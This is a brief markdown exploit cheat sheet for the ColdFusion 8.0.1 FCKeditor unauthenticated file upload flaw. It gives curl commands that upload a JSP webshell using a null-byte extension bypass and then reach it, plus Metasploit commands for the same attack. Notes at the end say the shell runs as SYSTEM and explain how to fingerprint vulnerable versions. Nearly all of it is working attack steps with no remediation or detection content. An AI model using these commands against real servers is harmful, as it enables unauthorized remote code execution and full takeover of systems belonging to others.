# ColdFusion 8 Unauthenticated File Upload RCE

ColdFusion 8.0.1 allows unauthenticated file upload via the FCKeditor component at `/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm`. Uploaded files are accessible via `/userfiles/file/`.

## Upload Webshell

```bash
# Upload JSP webshell via curl
curl -F "newfile=@shell.jsp;type=image/jpg" \
  "http://<TARGET>/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm?Command=FileUpload&Type=File&CurrentFolder=/shell.jsp%00"

# Access uploaded file (null byte truncates extension server-side)
curl "http://<TARGET>/userfiles/file/shell.jsp"
```

## Alternate: Metasploit
```
use exploit/windows/http/coldfusion_fckeditor
set RHOSTS <TARGET>
run
```

## Notes
- Null byte `%00` after `.jsp` causes the file manager to save with `.jsp` extension despite content-type check
- Uploaded path: `/userfiles/file/<filename>`
- ColdFusion runs as SYSTEM on Windows by default — direct privilege escalation
- Version fingerprint: `/CFIDE/administrator/` login page shows version
